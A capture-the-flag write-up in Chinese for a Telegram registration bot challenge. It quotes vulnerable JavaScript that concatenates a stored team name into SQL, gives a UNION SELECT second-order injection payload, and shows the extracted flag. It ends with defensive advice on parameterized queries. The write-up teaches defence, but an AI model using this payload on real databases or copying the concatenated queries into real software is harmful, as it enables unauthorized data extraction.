# bot

## 题目简述

题目是 Telegram 注册机器人。用户信息首次写入 SQLite 时使用参数化查询，但随后读取队友列表时，把数据库中取出的 `team` 直接拼进另一条 SQL。攻击者可把注入载荷先作为队名保存，再在第二次查询中触发。

## 解题过程

危险代码为：

```javascript
let team = (await db.get(
  `SELECT team FROM users WHERE user_id=${userId};`
)).team;

const query2 = `SELECT username FROM users WHERE team="${team}";`;
const members = (await db.all(query2)).map(r => r.username);
```

机器人只禁止队名包含 `drop`、`delete`、`update`、`set`，没有禁止 `UNION SELECT`。依次完成 `/start`、任意用户名和 8 位电话号码，在队名步骤输入：

```sql
" UNION SELECT flag FROM flag -- -
```

第二条查询会变成：

```sql
SELECT username FROM users WHERE team=""
UNION SELECT flag FROM flag -- -";
```

`flag` 表中的值与用户名结果合并。由于结果列沿用第一条查询的列名 `username`，后续 `.map(r => r.username)` 会把 Flag 当作队员名发送给用户：

```text
greyhats{Th4nk_y0u_f0r_pl4y1ng!}
```

## 方法总结

参数化写入不能自动保护后续查询。只要不可信数据被持久化后再次拼接进 SQL，仍会形成二阶注入。审计时应沿数据生命周期追踪“输入、存储、取出、再使用”，并对每一次 SQL 构造单独确认是否绑定参数；关键词黑名单既容易绕过，也不能替代参数化查询。
